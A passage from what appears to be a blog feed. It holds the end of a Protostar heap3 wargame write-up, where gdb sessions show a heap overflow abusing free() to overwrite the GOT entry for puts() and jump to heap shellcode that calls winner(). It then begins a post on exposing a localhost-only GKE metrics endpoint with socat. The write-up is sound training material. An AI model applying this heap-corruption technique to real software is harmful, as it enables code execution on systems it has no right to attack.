</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span><span class="p">)</span>
</span><span class='line'><span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already</span><span class="p">.</span>
</span><span class='line'><span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span><span class="p">)</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="n">Error</span> <span class="k">while</span> <span class="n">running</span> <span class="nl">hook_stop</span><span class="p">:</span>
</span><span class='line'><span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x804c000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
</span><span class='line'><span class="mi">3211</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s continue until we stop at the first <code>free()</code> call.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c058</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>Examine the GOT entry for <code>puts()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804b128</span>
</span><span class='line'><span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x08048796</span>
</span></code></pre></td></tr></table></div></figure>


<p>Continue and see that <code>free(c)</code> has overwritten the contents to the address of our shellcode!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c030</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804b128</span>
</span><span class='line'><span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x0804c014</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let the rest of the program run to see <code>winner()</code> is called.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">Breakpoint</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x08048790</span> <span class="n">in</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x0804c014</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x0804c019</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="n">winner</span> <span class="p">()</span> <span class="n">at</span> <span class="n">heap3</span><span class="o">/</span><span class="n">heap3</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">8</span>
</span><span class='line'><span class="mi">8</span> <span class="n">heap3</span><span class="o">/</span><span class="n">heap3</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span><span class="p">.</span>
</span><span class='line'>  <span class="n">in</span> <span class="n">heap3</span><span class="o">/</span><span class="n">heap3</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="n">that</span> <span class="n">wasn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">too</span> <span class="n">bad</span> <span class="n">now</span><span class="p">,</span> <span class="n">was</span> <span class="n">it</span><span class="o">?</span> <span class="err">@</span> <span class="mi">1587442625</span>
</span><span class='line'>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x0804c01b</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s run it without gdb.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="p">.</span><span class="o">/</span><span class="n">heap3</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span><span class="p">)</span>
</span><span class='line'><span class="n">that</span> <span class="n">wasn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">too</span> <span class="n">bad</span> <span class="n">now</span><span class="p">,</span> <span class="n">was</span> <span class="n">it</span><span class="o">?</span> <span class="err">@</span> <span class="mi">1587443061</span>
</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span>
</span></code></pre></td></tr></table></div></figure>


<p>Amazing.</p>

<h3>References</h3>

<ul>
<li><a href="https://www.youtube.com/watch?v=HWhzH--89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26">https://www.youtube.com/watch?v=HWhzH&#8211;89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26</a></li>
<li><a href="https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6">https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Expose a Localhost-only Endpoint on GKE]]></title>
    <link href="https://www.davidxia.com/2020/04/how-to-expose-a-localhost-only-endpoint-on-gke/"/>
    <updated>2020-04-13T12:24:46-04:00</updated>
    <id>https://www.davidxia.com/2020/04/how-to-expose-a-localhost-only-endpoint-on-gke</id>
    <content type="html"><![CDATA[<p>In my <a href="https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity/">previous post</a> I wrote about how to load test GKE Workload Identity. In this post I&rsquo;ll
describe how to get metrics from gke-metadata-server, the part of Workload Identity that runs on
your GKE clusters&#8217; nodes. This solution is a temporary workaround until GKE provides a better way to
get metrics on gke-metadata-server.</p>

<p>Gke-metadata-server runs as a K8s DaemonSet. It exposes metrics about itself in <a href="https://github.com/prometheus/docs/blob/master/content/docs/instrumenting/exposition_formats.md#text-based-format">Prometheus
text-based format</a>. I want to have an external scraper make HTTP requests to periodically collect
these metrics. Unfortunately, the Prometheus HTTP server only listens on the Container&rsquo;s <code>localhost</code>
interface. <strong>So how can we expose these metrics, i.e. make the HTTP endpoint available externally?</strong></p>

<h3>tl;dr lessons learned</h3>

<ul>
<li><code>socat</code> is awesome.</li>
<li>If something you need is running on a computer you control, you can always find a way extract info
from it if you&rsquo;re resourceful enough.</li>
</ul>


<!-- more -->


<h2>My specific GKE cluster configuration</h2>

<ul>
<li>GKE masters and nodes running version 1.15.9-gke.22</li>
<li>regional cluster in Google Cloud Platform (GCP) (not on-premise)</li>
<li>6 GKE nodes that are n1-standard-32 GCE instances in one node pool</li>
<li>each node is configured to have a maximum of 32 Pods</li>
<li>cluster and node pool have WI enabled</li>
</ul>


<p>Notice the DaemonSet is configured with <code>.spec.template.spec.hostNetwork: true</code> below. This means
the HTTP server is also listening on the GKE node&rsquo;s <code>localhost</code> interface.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
